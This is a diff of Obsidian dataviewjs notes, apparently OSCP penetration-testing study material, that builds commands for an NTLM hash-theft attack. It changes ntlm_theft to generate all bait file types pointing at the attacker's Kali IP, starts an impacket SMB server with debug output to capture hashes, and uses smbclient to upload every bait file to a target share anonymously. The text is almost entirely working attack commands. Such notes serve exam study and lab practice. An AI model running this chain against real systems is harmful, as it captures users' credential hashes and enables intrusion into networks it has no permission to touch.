@@ -3,14 +3,14 @@ Create vault.lnk
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `cd ~/Desktop/Tools/Windows/ntlm_theft && python3 ntlm_theft.py -g lnk -s ${KaliIP} -f vault`;
+const command = `cd ~/Desktop/Tools/Windows/ntlm_theft && python3 ntlm_theft.py -g all -s ${KaliIP} -f vault`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
 To fake our SMB server,  **impacket-smbserver**:
 
 ```
-sudo impacket-smbserver test . -smb2support -user admin -password password
+sudo impacket-smbserver test . -smb2support -debug
 ```
 
 Check if server is running
@@ -28,6 +28,4 @@ const command = `cd ~/Desktop/Tools/Windows/ntlm_theft/vault && smbclient //${ip
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
-```
-put vault.lnk
-```
+smbclient //TARGET_IP/SHARE_NAME -N -c "prompt OFF; mput *"
